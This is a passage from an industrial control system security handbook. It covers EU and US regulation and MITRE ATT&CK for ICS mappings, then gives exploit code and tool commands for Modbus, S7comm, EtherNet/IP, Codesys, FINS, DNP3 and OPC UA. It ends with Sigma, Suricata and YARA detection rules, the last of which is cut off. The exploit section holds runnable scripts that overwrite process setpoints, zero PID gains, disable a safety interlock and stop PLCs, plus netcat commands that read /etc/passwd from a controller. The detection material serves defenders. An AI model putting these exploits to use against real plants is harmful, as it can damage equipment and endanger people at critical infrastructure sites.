**NIS2 Directive (EU).** The EU's Network and Information Security Directive (NIS2, effective October 2024) significantly expands the scope of EU cybersecurity regulation to critical infrastructure operators including energy, transport, water, manufacturing, food production, and waste management. NIS2 requirements for OT-operating entities include: risk management measures (including OT-specific risk assessments covering physical process impacts), incident reporting (initial notification within 24 hours, detailed report within 72 hours, final report within one month), supply chain security (assessing cybersecurity risks from ICS vendors, system integrators, and managed service providers), vulnerability handling and disclosure, business continuity and crisis management, and cybersecurity hygiene practices and training. Penalties: up to 10 million EUR or 2% of global turnover for essential entities, with personal liability for management bodies that fail to approve and oversee cybersecurity risk management measures.

NIS2's OT implications are significant because it extends mandatory cybersecurity requirements to sectors (manufacturing, food production, water) that were previously not covered by sector-specific regulation. Organizations in these sectors must implement OT cybersecurity programs — asset inventory, network segmentation, monitoring, incident response — that the energy sector has been developing under NERC CIP and IEC 62443 for years.

**TSA Pipeline Security Directives (US).** Following the Colonial Pipeline ransomware attack (May 2021), the Transportation Security Administration (TSA) issued security directives for pipeline operators: SD-1 (incident reporting within 12 hours), SD-2A/2B/2C (cybersecurity implementation requirements — network segmentation, access controls, continuous monitoring, incident response planning, cybersecurity assessment plan). SD-2C (July 2023) requires: network segmentation policies preventing IT compromises from reaching OT, access control measures for OT networks (MFA for remote access, role-based access for local access), continuous monitoring and detection capabilities for OT networks, and annual cybersecurity assessment by a third-party assessor. These directives transformed pipeline cybersecurity from voluntary to mandatory and created a compliance model that other critical infrastructure sectors may follow.

### 8.4 MITRE ATT&CK for ICS

The MITRE ATT&CK for ICS framework provides a structured taxonomy of adversary techniques specific to industrial control systems, organized across 12 tactics. Key techniques observed in the attacks analyzed in this chapter:

**Initial Access:** T0817 (Drive-by Compromise — Havex via watering-hole attacks on ICS vendor websites), T0819 (Exploit Public-Facing Application — FrostyGoop targeting internet-exposed Modbus TCP controllers), T0886 (Remote Services — Oldsmar via TeamViewer, Colonial Pipeline lateral movement).

**Execution:** T0807 (Command-Line Interface — INDUSTROYER executing ICS modules from the Windows command line), T0871 (Execution through API — TRITON communicating via TriStation protocol API).

**Persistence:** T0839 (Module Firmware — Stuxnet modifying the S7 PLC firmware), T0891 (Hardcoded Credentials — Codesys V3 default credentials enabling persistent access).

**Inhibit Response Function:** T0800 (Activate Firmware Update Mode — TRITON placing the Triconex in PROGRAM mode), T0804 (Block Reporting Message — Stuxnet intercepting PLC input reads and substituting pre-recorded values), T0814 (Denial of Service — INDUSTROYER's SIPROTEC DoS disabling protection relays), T0816 (Device Restart/Shutdown — INDUSTROYER's data wiper preventing SCADA workstation operation).

**Impact:** T0831 (Manipulation of Control — INDUSTROYER opening circuit breakers, FrostyGoop modifying temperature setpoints, Stuxnet manipulating centrifuge frequency converters), T0882 (Theft of Operational Information — Havex enumerating OPC DA tags and values).

Mapping observed ICS incidents to ATT&CK for ICS enables: detection engineering (writing detection rules for specific techniques), threat hunting (searching for indicators of specific techniques in OT network data), and gap analysis (identifying which techniques the organization's defenses can and cannot detect). Dragos integrates ATT&CK for ICS mapping into its threat intelligence reports for each tracked activity group. MITRE also maintains the ATT&CK for ICS Navigator, a web-based tool for creating layered visualizations of technique coverage — mapping the organization's detection capabilities against the ATT&CK for ICS matrix to identify coverage gaps. Detection engineering teams use these gap analyses to prioritize the development of new detection rules: if the organization can detect T0886 (Remote Services) but cannot detect T0831 (Manipulation of Control), the team prioritizes developing protocol-level monitoring for control command manipulation.

---

## 9. ICS protocol exploitation tools and techniques

This section provides exact tool usage and exploit code for the ICS protocols analyzed in companion chapter 16A. The code here targets real protocol weaknesses; chapter 16A covers the protocol internals (frame formats, function codes, session mechanics). Every snippet assumes the operator has authorized scope per the facility's rules of engagement.

### 9.1 Scapy crafting for Modbus TCP

Scapy can construct arbitrary Modbus TCP frames. The Modbus TCP wrapper consists of a 7-byte MBAP header (Transaction ID, Protocol ID 0x0000, Length, Unit ID) followed by the Modbus PDU. Building packets from raw bytes gives full control over every field, enabling protocol fuzzing and injection of non-standard function codes that commercial tools may reject.

```python
#!/usr/bin/env python3
"""Scapy-based Modbus TCP packet crafter — read/write coils and registers,
plus function-code fuzzer."""

from scapy.all import IP, TCP, Raw, send, sr1
import struct, random

TARGET_IP   = "192.168.1.100"
TARGET_PORT = 502
UNIT_ID     = 1

def mbap_header(pdu_len: int, unit_id: int = UNIT_ID) -> bytes:
    txn_id = random.randint(0, 0xFFFF)
    proto  = 0x0000  # Modbus protocol identifier
    length = pdu_len + 1  # PDU length + unit ID byte
    return struct.pack(">HHHB", txn_id, proto, length, unit_id)

def read_holding_registers(start: int, count: int) -> bytes:
    """Function code 0x03 — Read Holding Registers."""
    pdu = struct.pack(">BHH", 0x03, start, count)
    return mbap_header(len(pdu)) + pdu

def write_single_register(addr: int, value: int) -> bytes:
    """Function code 0x06 — Write Single Register."""
    pdu = struct.pack(">BHH", 0x06, addr, value)
    return mbap_header(len(pdu)) + pdu

def write_multiple_registers(start: int, values: list[int]) -> bytes:
    """Function code 0x10 (16) — Write Multiple Registers."""
    count = len(values)
    byte_count = count * 2
    pdu = struct.pack(">BHHB", 0x10, start, count, byte_count)
    for v in values:
        pdu += struct.pack(">H", v)
    return mbap_header(len(pdu)) + pdu

def write_single_coil(addr: int, on: bool) -> bytes:
    """Function code 0x05 — Write Single Coil (0xFF00 = ON, 0x0000 = OFF)."""
    val = 0xFF00 if on else 0x0000
    pdu = struct.pack(">BHH", 0x05, addr, val)
    return mbap_header(len(pdu)) + pdu

def fuzz_function_codes(start_fc: int = 0x00, end_fc: int = 0xFF) -> None:
    """Send every function code with a minimal payload to identify
    supported and improperly validated function codes."""
    for fc in range(start_fc, end_fc + 1):
        pdu = struct.pack(">B", fc) + b"\x00\x00\x00\x00"
        raw = mbap_header(len(pdu)) + pdu
        pkt = IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT) / Raw(load=raw)
        resp = sr1(pkt, timeout=2, verbose=0)
        if resp and Raw in resp:
            payload = bytes(resp[Raw])
            # Exception response: function code + 0x80
            if len(payload) > 7 and payload[7] == (fc | 0x80):
                exc_code = payload[8] if len(payload) > 8 else 0
                print(f"FC 0x{fc:02X}: exception code {exc_code}")
            else:
                print(f"FC 0x{fc:02X}: valid response ({len(payload)} bytes)")
        else:
            print(f"FC 0x{fc:02X}: no response / timeout")

if __name__ == "__main__":
    # Example: read registers 0-9, then overwrite register 40001
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_IP, TARGET_PORT))
    sock.send(read_holding_registers(0, 10))
    print("Read response:", sock.recv(1024).hex())
    sock.send(write_single_register(0, 0x1234))
    print("Write response:", sock.recv(1024).hex())
    sock.close()
```

The fuzzer iterates through all 256 possible function codes. Devices that return valid (non-exception) responses to undocumented function codes may expose hidden diagnostic modes, firmware update interfaces, or vendor-specific backdoors. CVE-2017-6034 (Schneider Modicon M340) involved undocumented function code 90 (0x5A) returning sensitive device information. Prerequisite: TCP connectivity to the target on port 502 and no upstream Modbus-aware firewall filtering writes.

### 9.2 pymodbus exploitation

pymodbus v3.x provides a high-level Modbus TCP client suitable for scripted exploitation and automated register manipulation. The library handles MBAP framing, transaction management, and response parsing.

```python
#!/usr/bin/env python3
"""pymodbus-based Modbus exploitation — register dumping, coil toggling,
and automated setpoint manipulation."""

from pymodbus.client import ModbusTcpClient
import time, sys

TARGET = "192.168.1.100"
PORT   = 502
UNIT   = 1

client = ModbusTcpClient(TARGET, port=PORT)
if not client.connect():
    sys.exit(f"Cannot reach {TARGET}:{PORT}")

# --- Reconnaissance: dump holding registers 0-99 ---
for base in range(0, 100, 10):
    rr = client.read_holding_registers(base, 10, slave=UNIT)
    if not rr.isError():
        for i, val in enumerate(rr.registers):
            print(f"  HR[{base+i:5d}] = {val} (0x{val:04X})")

# --- Manipulation: overwrite temperature setpoint ---
# Assumes register 40010 holds the temperature setpoint (common layout)
SETPOINT_REG = 10   # Modbus address offset (40010 → offset 10)
MALICIOUS_SP = 0    # Drive setpoint to 0 (freeze the process)

wr = client.write_register(SETPOINT_REG, MALICIOUS_SP, slave=UNIT)
print(f"Write setpoint register {SETPOINT_REG}: {'OK' if not wr.isError() else wr}")

# --- Coil toggling: cycle a digital output on/off ---
COIL_ADDR = 0
for state in [True, False, True]:
    client.write_coil(COIL_ADDR, state, slave=UNIT)
    time.sleep(0.5)

# --- Batch write: overwrite PID parameters ---
# Registers 20-22: Kp, Ki, Kd for a PID loop
client.write_registers(20, [0, 0, 0], slave=UNIT)  # zero out PID gains
print("PID gains zeroed — process control loop disabled")

client.close()
```

Zeroing PID gains disables the control loop without changing the program. The process variable drifts uncorrected, causing the controlled parameter (temperature, pressure, flow) to exceed safe limits over time. This data-only attack leaves the PLC program hash unchanged, defeating program-integrity monitoring (section 6.3). Detection requires monitoring register write values against expected ranges.

### 9.3 python-snap7 for S7comm exploitation

python-snap7 wraps the open-source Snap7 library to communicate with Siemens S7-300, S7-400, S7-1200, and S7-1500 PLCs over the S7comm protocol. It provides program upload/download, memory read/write, and diagnostic access.

```python
#!/usr/bin/env python3
"""python-snap7 — connect to S7 PLC, read/write data blocks,
download program blocks, read SZL system status."""

import snap7
from snap7.util import get_int, set_int, get_real, set_real
import hashlib, sys

PLC_IP   = "192.168.1.10"
RACK     = 0
SLOT     = 1

client = snap7.client.Client()
try:
    client.connect(PLC_IP, RACK, SLOT)
except Exception as e:
    sys.exit(f"Connection failed: {e}")

print(f"Connected to {PLC_IP} — CPU state: {client.get_cpu_state()}")

# --- Read SZL (System Status List) for device identification ---
# SZL-ID 0x001C: component identification
szl = client.read_szl(0x001C, 0x0000)
print(f"SZL 0x001C: {szl.Data[:64]}")

# --- Read a Data Block (DB1, offset 0, 100 bytes) ---
db_number = 1
db_data = client.db_read(db_number, 0, 100)
print(f"DB{db_number} first 100 bytes: {db_data.hex()}")

# Extract a 16-bit integer at byte offset 10
setpoint = get_int(db_data, 10)
print(f"  DB{db_number}.DBW10 (setpoint) = {setpoint}")

# Extract a 32-bit REAL at byte offset 20
temperature = get_real(db_data, 20)
print(f"  DB{db_number}.DBD20 (temperature) = {temperature:.2f}")

# --- Write to a Data Block: modify setpoint ---
MALICIOUS_SETPOINT = 9999
set_int(db_data, 10, MALICIOUS_SETPOINT)
client.db_write(db_number, 0, db_data)
print(f"  DB{db_number}.DBW10 overwritten to {MALICIOUS_SETPOINT}")

# --- Download program blocks for integrity verification ---
BLOCK_TYPES = {
    snap7.types.Block_OB: "OB",
    snap7.types.Block_FB: "FB",
    snap7.types.Block_FC: "FC",
    snap7.types.Block_DB: "DB",
}

for btype, bname in BLOCK_TYPES.items():
    block_list = client.list_blocks_of_type(btype, 1024)
    for bn in block_list:
        try:
            data = client.full_upload(btype, bn)
            digest = hashlib.sha256(data).hexdigest()
            print(f"  {bname}{bn}: {len(data)} bytes, SHA-256={digest[:16]}...")
        except Exception as e:
            print(f"  {bname}{bn}: upload failed — {e}")

# --- PLC Stop command (DANGEROUS — halts process control) ---
# client.plc_stop()
# print("PLC STOPPED — process control halted")

client.disconnect()
```

The `full_upload` method retrieves the compiled block binary, which can be hashed against a golden image (section 12.3). Writing to data blocks modifies setpoints and parameters without touching the program logic; writing arbitrary values to DB areas that hold PID setpoints, alarm limits, or recipe data achieves process manipulation without triggering program-change detection. The `plc_stop()` call halts the PLC entirely, stopping all outputs and potentially leaving the process in an unsafe state. CVE-2019-13945 allowed unauthenticated PLC Stop on S7-1200 v4.x. S7-1500 v2.9+ requires a session password for write operations, but many field-deployed units run older firmware.

### 9.4 ISF and Metasploit ICS modules

The Industrial Exploitation Framework (ISF) and Metasploit provide pre-built modules for common ICS targets.

```bash
# --- ISF (Industrial Exploitation Framework) ---
# Installation
git clone https://github.com/dark-lbp/isf.git && cd isf
pip install -r requirements.txt
python isf.py

# ISF commands for Schneider Modicon M340 exploitation
isf > use exploits/plcs/schneider/modicon_m340_exec
isf (modicon_m340_exec) > set target 192.168.1.100
isf (modicon_m340_exec) > run

# --- Metasploit ICS modules ---
# Modbus client for reading/writing
use auxiliary/scanner/scada/modbusclient
set RHOSTS 192.168.1.100
set DATA_ADDRESS 0
set NUMBER 10
set ACTION READ_HOLDING_REGISTERS
run

# Write to a Modbus register
set ACTION WRITE_REGISTER
set DATA_ADDRESS 10
set DATA 9999
run

# Siemens S7 enumeration
use auxiliary/scanner/scada/s7_udp_discover
set RHOSTS 192.168.1.0/24
run

# Allen-Bradley/Rockwell EtherNet/IP enumeration
use auxiliary/scanner/scada/ethernetip_info
set RHOSTS 192.168.1.0/24
run

# CoDeSys V2 directory traversal
use auxiliary/admin/scada/codesys_v2_exec
set RHOST 192.168.1.50
run

# Schneider Modicon password extraction
use auxiliary/admin/scada/modicon_password_recovery
set RHOST 192.168.1.100
run

# Schneider Electric UMAS protocol — Modicon M340/M580
use auxiliary/scanner/scada/modicon_stuxnet
set RHOSTS 192.168.1.100
run
```

Metasploit's `modbusclient` module is the quickest way to validate Modbus read/write access during a pentest. The S7 UDP discovery module sends S7comm identification requests to port 102 and extracts module type, serial number, firmware version, and hardware version — essential reconnaissance for selecting the correct exploit. The Codesys module exploits the V2 runtime's unauthenticated shell access (default on port 2455), providing arbitrary command execution on the PLC's underlying OS.

### 9.5 EtherNet/IP exploitation with pycomm3

pycomm3 communicates with Allen-Bradley/Rockwell Logix PLCs over EtherNet/IP using the CIP (Common Industrial Protocol) application layer.

```python
#!/usr/bin/env python3
"""pycomm3 — read and write tags on Allen-Bradley ControlLogix/CompactLogix."""

from pycomm3 import LogixDriver

PLC_IP = "192.168.1.200"

with LogixDriver(PLC_IP) as plc:
    # Enumerate all tags (full address space discovery)
    tags = plc.get_tag_list()
    for tag in tags:
        print(f"  {tag.tag_name}: type={tag.data_type}, dim={tag.dimensions}")

    # Read specific tags
    result = plc.read("ReactorTemp_PV")
    print(f"ReactorTemp_PV = {result.value} (type: {result.type})")

    # Read multiple tags in a single request
    results = plc.read("ReactorTemp_PV", "ReactorTemp_SP", "Pump1_Run", "EStop_Status")
    for r in results:
        print(f"  {r.tag}: {r.value}")

    # Write a single tag (modify temperature setpoint)
    plc.write("ReactorTemp_SP", 450.0)
    print("ReactorTemp_SP overwritten to 450.0")

    # Write multiple tags atomically
    plc.write(("Pump1_Speed_SP", 3600), ("Mixer_Speed_SP", 0))
    print("Pump and mixer setpoints modified")

    # Read a program-scoped tag
    result = plc.read("Program:MainProgram.SafetyInterlock_Enable")
    print(f"SafetyInterlock_Enable = {result.value}")

    # Disable a safety interlock (if writable)
    plc.write("Program:MainProgram.SafetyInterlock_Enable", False)
    print("Safety interlock DISABLED")
```

EtherNet/IP with CIP provides human-readable tag names (unlike Modbus register addresses), making the tag enumeration phase simultaneously reconnaissance and semantic mapping of the controlled process. The attacker learns what "ReactorTemp_SP" controls without needing a process engineering manual. CVE-2023-3595 (Rockwell 1756 ControlLogix/GuardLogix) allowed unauthenticated remote code execution via crafted CIP messages, enabling firmware modification on the target PLC.

### 9.6 Codesys V3 exploitation

Codesys V3 runtime's management interface (TCP 11740) accepts connections from the Codesys Development System IDE. When authentication is disabled (CVE-2022-31806 — default configuration), an attacker with network access can upload arbitrary programs.

```bash
# Using the Codesys command-line shell (codesyscontrol.cfg)
# Default Codesys V2 runtime shell on port 2455 (if enabled)
echo "?ol" | nc 192.168.1.50 2455      # list running applications
echo "?ld /" | nc 192.168.1.50 2455     # directory listing of filesystem
echo "?lo /etc/passwd" | nc 192.168.1.50 2455  # read file from PLC OS
```

```python
#!/usr/bin/env python3
"""Codesys V3 unauthenticated program upload via the programming interface.
Requires the codesys-client library or raw socket implementation."""

import socket, struct

TARGET = "192.168.1.50"
PORT   = 11740  # Codesys V3 programming interface

def codesys_connect(ip: str, port: int) -> socket.socket:
    """Establish a Codesys V3 channel handshake."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    # Channel initiation — Codesys V3 uses a proprietary binary protocol
    # with service-group/service-id command structure
    init_pkt = b"\xbb\xbb"  # magic header
    init_pkt += struct.pack("<H", 0x0001)  # channel open request
    s.send(init_pkt)
    resp = s.recv(1024)
    return s

# The full programming protocol requires reimplementing the
# Codesys Block Driver protocol for program upload (IEC 61131-3 compiled
# bytecode). EVILSCHOLAR (PIPEDREAM) implemented this protocol fully.
# For authorized pentesting, use the Codesys Development System in
# command-line mode or the ISF codesys modules.
```

The V2 runtime's shell interface on port 2455 provides unrestricted filesystem and OS access by default — equivalent to root shell on the PLC's embedded Linux. The V3 programming interface requires reimplementing the proprietary block-driver protocol for full program upload, which is what EVILSCHOLAR accomplished. For authorized assessments, the Codesys Development System's scripting interface or ISF modules provide the same capability without protocol reimplementation.

### 9.7 Omron FINS packet crafting

FINS (Factory Interface Network Service) operates over UDP port 9600. The protocol has no authentication in its default configuration. FINS commands provide full read/write access to PLC memory areas and program upload/download.

```python
#!/usr/bin/env python3
"""Omron FINS exploitation — memory read/write via raw UDP."""

import socket, struct

TARGET = "192.168.1.30"
FINS_PORT = 9600

# FINS header constants
ICF_CMD  = 0x80  # command (not response)
RSV      = 0x00
GCT      = 0x02  # gateway count
DNA      = 0x00  # destination network address
DA1      = 0x00  # destination node address (0 = PLC)
DA2      = 0x00  # destination unit address
SNA      = 0x00  # source network address
SA1      = 0x01  # source node address (us)
SA2      = 0x00  # source unit address
SID      = 0x00  # service ID

def fins_header(cmd_code: int, sub_code: int) -> bytes:
    hdr = struct.pack("BBBBBBBBBB",
        ICF_CMD, RSV, GCT, DNA, DA1, DA2, SNA, SA1, SA2, SID)
    hdr += struct.pack(">HH", cmd_code, sub_code)
    return hdr

def memory_read(area_code: int, start_addr: int, num_items: int) -> bytes:
    """FINS command 0101 — Memory Area Read."""
    hdr = fins_header(0x0101, 0x0000)
    # Memory area address: area_code (1 byte) + address (2 bytes) + bit (1 byte)
    payload = struct.pack(">B", area_code)
    payload += struct.pack(">HB", start_addr, 0x00)
    payload += struct.pack(">H", num_items)
    return hdr + payload

def memory_write(area_code: int, start_addr: int, data: list[int]) -> bytes:
    """FINS command 0102 — Memory Area Write."""
    hdr = fins_header(0x0102, 0x0000)
    num_items = len(data)
    payload = struct.pack(">B", area_code)
    payload += struct.pack(">HB", start_addr, 0x00)
    payload += struct.pack(">H", num_items)
    for word in data:
        payload += struct.pack(">H", word)
    return hdr + payload

# FINS memory area codes
DM_AREA  = 0x82  # Data Memory (word access)
CIO_AREA = 0x30  # CIO area (word access)
WR_AREA  = 0x31  # Work area
HR_AREA  = 0x32  # Holding area

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)

# Read DM0-DM99 (100 words from Data Memory)
pkt = memory_read(DM_AREA, 0, 100)
sock.sendto(pkt, (TARGET, FINS_PORT))
resp, _ = sock.recvfrom(4096)
print(f"DM read response: {resp.hex()}")

# Write malicious values to DM10-DM12 (setpoints)
pkt = memory_write(DM_AREA, 10, [0, 0, 9999])
sock.sendto(pkt, (TARGET, FINS_PORT))
resp, _ = sock.recvfrom(4096)
print(f"DM write response: {resp.hex()}")

sock.close()
```

FINS area code 0x82 accesses Data Memory as 16-bit words. BADOMEN (PIPEDREAM component, section 3.3) used this exact mechanism to read and write Omron NX/NJ PLC memory. The protocol's lack of authentication means any host with UDP connectivity to port 9600 can read or write any PLC memory area. Detection: alert on FINS traffic from any source that is not the designated engineering workstation or HMI.

### 9.8 DNP3 manipulation tools

DNP3 (Distributed Network Protocol 3) is used extensively in electric utilities and water systems. The protocol supports unsolicited responses from outstations (the outstation pushes data to the master without being asked), which creates an injection opportunity.

```bash
# DNP3 scanning with Nmap
nmap -sT -p 20000 --script dnp3-info 192.168.1.0/24

# Using the Aegis DNP3 master simulator for command injection testing
# (open-source DNP3 test tool)
# Send a Direct Operate (CROB — Control Relay Output Block) to
# toggle a binary output point
aegis-dnp3-master --ip 192.168.1.50 --port 20000 \
    --direct-operate --index 0 --control-code latch-on

# Using OpenDNP3 (C++ library with Python bindings) for custom DNP3 frames
```

```python
#!/usr/bin/env python3
"""DNP3 direct-operate command injection using pydnp3 bindings.
Sends a CROB (Control Relay Output Block) to toggle binary output 0."""

# pydnp3 provides Python bindings for the opendnp3 library
from pydnp3 import opendnp3, asiodnp3

# DNP3 exploitation typically requires:
# 1. Master station impersonation (spoofing the master's DNP3 address)
# 2. Sending Direct Operate or Select-Before-Operate commands
# 3. Injecting unsolicited response frames (outstation spoofing)
#
# Key DNP3 function codes for exploitation:
#   0x03 — Direct Operate (immediate command execution)
#   0x04 — Direct Operate No Ack
#   0x81 — Response (can be spoofed as unsolicited response)
#
# DNP3 Secure Authentication (SA, IEEE 1815-2012) adds HMAC-based
# challenge-response to critical operations. Without SA, DNP3 commands
# are accepted from any source that knows the outstation's address.
```

DNP3 Secure Authentication (DNP3-SA, standardized in IEEE 1815-2012) mitigates command injection by requiring HMAC challenge-response before accepting control operations. Adoption remains limited; many deployed outstations and masters do not support SA. CVE-2020-15791 (Siemens SIMATIC S7-300/S7-400) demonstrated the broader class of ICS authentication bypass — the vulnerability allowed remote attackers to bypass authentication on the CPU communication interface, reinforcing why protocol-level authentication (SA for DNP3, S7comm-plus encrypted sessions for Siemens) must be enforced wherever available.

### 9.9 OPC UA exploitation with opcua-asyncio

OPC UA is increasingly deployed as the convergence protocol bridging legacy ICS protocols to modern IT/cloud architectures. The opcua-asyncio library provides a complete OPC UA client in Python.

```python
#!/usr/bin/env python3
"""OPC UA exploitation — server discovery, address space browsing,
and value writing using opcua-asyncio."""

import asyncio
from asyncua import Client, ua

OPC_UA_URL = "opc.tcp://192.168.1.100:4840"

async def exploit():
    async with Client(url=OPC_UA_URL) as client:
        # Try anonymous connection first (SecurityPolicy: None)
        # If rejected, try username/password with common defaults
        # client.set_user("admin")
        # client.set_password("admin")

        # Browse the root node
        root = client.get_root_node()
        objects = await root.get_child(["0:Objects"])
        children = await objects.get_children()

        for child in children:
            name = await child.read_browse_name()
            print(f"  Node: {name.Name} (NodeId: {child.nodeid})")

        # Recursive browse to discover all writable nodes
        async def browse_recursive(node, depth=0):
            if depth > 5:
                return
            children = await node.get_children()
            for child in children:
                name = await child.read_browse_name()
                try:
                    access = await child.read_attribute(ua.AttributeIds.AccessLevel)
                    value = await child.read_value()
                    writable = bool(access.Value.Value & 0x02)
                    print(f"{'  ' * depth}{name.Name}: value={value}, "
                          f"writable={writable}")
                except Exception:
                    pass
                await browse_recursive(child, depth + 1)

        await browse_recursive(objects)

        # Write to a discovered writable node
        # Example: modify a temperature setpoint node
        # node = client.get_node("ns=2;s=ReactorTemp_SP")
        # await node.set_value(ua.Variant(999.0, ua.VariantType.Float))
        # print("ReactorTemp_SP overwritten via OPC UA")

asyncio.run(exploit())
```

MOUSEHOLE (section 3.4) implemented the same browsing and writing capabilities. OPC UA servers configured with SecurityPolicy None and anonymous access enabled are fully exposed. The recursive browse reveals the complete semantic model of the controlled process — node names, engineering units, alarm limits, and current values. CVE-2022-25761 (OPC Foundation UA .NET Standard Stack) enabled denial of service through malformed certificate chains in the secure channel handshake.

---

## 10. ICS-specific detection rules

### 10.1 Sigma rules for ICS malware indicators

Sigma rules target the SIEM layer (Splunk, Elastic, Microsoft Sentinel) where Windows event logs, Sysmon telemetry, and ICS-specific log sources are aggregated.

```yaml
# --- TRITON indicators on engineering workstations ---
title: TRITON Framework Indicators on Engineering Workstation
id: e7a1f0c3-9b2d-4e8a-b3c1-d5f2e6a7b8c9
status: stable
description: >
    Detects indicators of TRITON/TRISIS deployment on SIS engineering
    workstations — py2exe compiled executables, TriStation protocol traffic
    artifacts, and suspicious Python-related file creation.
references:
    - https://attack.mitre.org/software/S0609/
    - https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html
author: ICS Security Team
date: 2026-05-08
logsource:
    category: file_event
    product: windows
detection:
    selection_triton_files:
        TargetFilename|endswith:
            - '\trilog.exe'
            - '\inject.bin'
            - '\imain.bin'
            - '\TsHi498.dll'
            - '\TsBase.dll'
            - '\TsLow.dll'
    selection_py2exe:
        TargetFilename|endswith:
            - '\library.zip'     # py2exe runtime dependency
            - '\python27.dll'    # Python 2.7 runtime on OT workstation
        TargetFilename|contains:
            - '\Temp\'
            - '\AppData\Local\Temp\'
    condition: selection_triton_files or selection_py2exe
level: critical
tags:
    - attack.execution
    - attack.t0871
falsepositives:
    - Legitimate Python development on engineering workstations (should not occur)
---
# --- INDUSTROYER indicators ---
title: INDUSTROYER TOR Communication from SCADA Network
id: a2b3c4d5-6e7f-8a9b-0c1d-2e3f4a5b6c7d
status: stable
description: >
    Detects TOR network traffic originating from SCADA or OT network segments.
    INDUSTROYER used TOR for C2 communication from compromised SCADA workstations.
author: ICS Security Team
date: 2026-05-08
logsource:
    category: firewall
detection:
    selection_tor_ports:
        dst_port:
            - 9001
            - 9030
            - 9050
            - 9051
            - 9150
    selection_ot_source:
        src_ip|cidr:
            - '10.10.0.0/16'     # OT network range (adjust per site)
            - '192.168.100.0/24' # SCADA VLAN (adjust per site)
    condition: selection_tor_ports and selection_ot_source
level: critical
tags:
    - attack.command_and_control
    - attack.t0885
falsepositives:
    - None expected in OT environments
---
# --- PIPEDREAM/CHERNOVITE indicators ---
title: PIPEDREAM Codesys Connection from Non-Engineering IP
id: f1e2d3c4-b5a6-9788-6c5d-4e3f2a1b0c9d
status: stable
description: >
    Detects Codesys V3 programming interface connections (TCP 11740) from
    IP addresses not in the approved engineering workstation list.
author: ICS Security Team
date: 2026-05-08
logsource:
    category: firewall
detection:
    selection_codesys:
        dst_port: 11740
    filter_approved:
        src_ip:
            - '10.10.2.50'    # Approved engineering WS 1 (adjust per site)
            - '10.10.2.51'    # Approved engineering WS 2 (adjust per site)
    condition: selection_codesys and not filter_approved
level: high
tags:
    - attack.lateral_movement
    - attack.t0886
falsepositives:
    - Newly deployed engineering workstation not yet in approved list
```

### 10.2 Suricata rules for ICS protocol abuse

Suricata rules operate at the network layer, inspecting packet payloads for protocol-specific attack patterns. These rules require Suricata to be deployed on a SPAN/mirror port covering the OT network.

```
# --- Modbus write from unauthorized source ---
alert tcp !$SCADA_SERVERS any -> $MODBUS_DEVICES 502 (
    msg:"ICS — Modbus Write Single Register from unauthorized source";
    flow:to_server,established;
    content:"|00 00|"; offset:2; depth:2;  # Protocol ID = 0x0000
    byte_test:1,=,0x06,7;                  # Function code 0x06 at byte 7
    sid:3000001; rev:1;
    metadata:severity critical, mitre_attack T0831;
)

alert tcp !$SCADA_SERVERS any -> $MODBUS_DEVICES 502 (
    msg:"ICS — Modbus Write Multiple Registers from unauthorized source";
    flow:to_server,established;
    content:"|00 00|"; offset:2; depth:2;
    byte_test:1,=,0x10,7;                  # Function code 0x10 (16)
    sid:3000002; rev:1;
    metadata:severity critical, mitre_attack T0831;
)

# --- S7comm PLC Stop command ---
alert tcp any any -> $S7_PLCS 102 (
    msg:"ICS — S7comm PLC Stop command detected";
    flow:to_server,established;
    content:"|32 01|";                       # S7comm protocol header
    content:"|29|"; offset:17; depth:1;      # Function code 0x29 = PLC Stop
    sid:3000010; rev:1;
    metadata:severity critical, mitre_attack T0816;
)

# --- S7comm Program Download ---
alert tcp !$ENGINEERING_WS any -> $S7_PLCS 102 (
    msg:"ICS — S7comm Program Download from non-engineering workstation";
    flow:to_server,established;
    content:"|32 01|";
    content:"|1a|"; offset:17; depth:1;      # Function code 0x1A = Download
    sid:3000011; rev:1;
    metadata:severity critical, mitre_attack T0839;
)

# --- IEC 104 command from non-SCADA IP ---
alert tcp !$IEC104_MASTERS any -> $IEC104_SLAVES 2404 (
    msg:"ICS — IEC 104 control command from unauthorized source";
    flow:to_server,established;
    # I-format frame with Type ID in ASDU indicating command
    # C_SC_NA_1 (45), C_DC_NA_1 (46), C_SE_NA_1 (48)
    byte_test:1,>=,45,6;
    byte_test:1,<=,70,6;
    sid:3000020; rev:1;
    metadata:severity critical, mitre_attack T0831;
)

# --- Codesys V3 unauthenticated connection ---
alert tcp any any -> $CODESYS_DEVICES 11740 (
    msg:"ICS — Codesys V3 programming interface connection";
    flow:to_server,established;
    content:"|bb bb|"; depth:2;  # Codesys channel magic
    sid:3000030; rev:1;
    metadata:severity high, mitre_attack T0886;
)

# --- GOOSE anomaly: new publisher MAC ---
# Note: GOOSE is Layer 2 (EtherType 0x88B8), requires Suricata AF_PACKET
alert ethernet any any -> any any (
    msg:"ICS — GOOSE frame from unknown MAC address";
    content:"|88 b8|"; offset:12; depth:2;   # EtherType GOOSE
    # Requires Suricata >= 7.0 with AF_PACKET in IDS mode for L2 inspection.
    # For Suricata < 7.0, use a BPF capture filter "ether proto 0x88b8"
    # and "alert ip any any -> any any" with matching on raw packet bytes.
    # In production, whitelist known IED MAC addresses via threshold/suppress.
    sid:3000040; rev:1;
    metadata:severity high, mitre_attack T0831;
)
```

The `$SCADA_SERVERS`, `$MODBUS_DEVICES`, `$S7_PLCS`, `$ENGINEERING_WS`, `$IEC104_MASTERS`, `$IEC104_SLAVES`, and `$CODESYS_DEVICES` variables must be defined in Suricata's configuration (suricata.yaml) with site-specific IP addresses. The GOOSE rule requires Layer 2 inspection and MAC address whitelisting per site — deploying it without a whitelist generates excessive alerts from legitimate IED traffic.

### 10.3 YARA rules for ICS malware

YARA rules scan files on engineering workstations, jump servers, and historian servers for known ICS malware components.

```yara
rule TRITON_Framework {
    meta:
        description = "Detects TRITON/TRISIS framework components"
        author = "ICS Security Team"
        date = "2026-05-08"
        severity = "critical"
        mitre_attack = "T0871, S0609"
        reference = "https://attack.mitre.org/software/S0609/"
    strings:
        $tristation_magic = { 01 00 00 00 ?? ?? ?? ?? 01 00 }
        $inject_str = "inject.bin" ascii wide
        $imain_str = "imain.bin" ascii wide
        $trilog_str = "trilog" ascii wide nocase
